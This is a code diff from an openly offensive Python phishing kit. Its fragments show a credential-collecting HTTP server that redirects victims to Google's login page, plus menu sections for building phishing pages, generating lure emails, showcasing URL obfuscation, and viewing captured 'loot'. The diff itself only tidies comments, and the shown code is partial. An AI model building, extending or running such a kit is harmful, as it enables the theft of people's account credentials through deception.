@@ -492,7 +492,7 @@ class CredentialCollector(BaseHTTPRequestHandler):
     redirect_to = "https://accounts.google.com"  # default redirect
 
     def log_message(self, format, *args):
-        # Suppress default HTTP log — use our own
+        # Suppress default HTTP log use our own
         pass
 
     def do_GET(self):
@@ -657,7 +657,7 @@ def run_phishing_kit():
 
         choice = Prompt.ask("[bold]Choice[/bold]", choices=["0","1","2","3","4","5"])
 
-        # ── 1. Page Builder ───────────────────────────────────────────────────
+        # 1. Page Builder
         if choice == "1":
             _clear()
             _header("Phishing Page Builder")
@@ -688,7 +688,7 @@ def run_phishing_kit():
             if Confirm.ask("\nStart local preview server?"):
                 start_collector_server(html, int(port), redirect_url)
 
-        # ── 2. Lure Email Generator ───────────────────────────────────────────
+        # 2. Lure Email Generator
         elif choice == "2":
             _clear()
             _header("Lure Email Generator")
@@ -721,7 +721,7 @@ def run_phishing_kit():
 
             input("\n  Press Enter to continue...")
 
-        # ── 3. Obfuscation Showcase ───────────────────────────────────────────
+        # 3. Obfuscation Showcase
         elif choice == "3":
             _clear()
             _header("URL Obfuscation Techniques")
@@ -741,7 +741,7 @@ def run_phishing_kit():
             console.print(table)
             input("\n  Press Enter to continue...")
 
-        # ── 4. Start Collector ────────────────────────────────────────────────
+        # 4. Start Collector
         elif choice == "4":
             _clear()
             _header("Credential Collector Server")
@@ -769,7 +769,7 @@ def run_phishing_kit():
             console.print(f"[bold green]✔ Loot file:[/bold green] [cyan]{LOOT_FILE}[/cyan]")
             start_collector_server(html, port, redirect_url)
 
-        # ── 5. View Loot ───────────────────────────────────
+        # 5. View Loot
         elif choice == "5":
             _clear()
             _header("Captured Credentials")
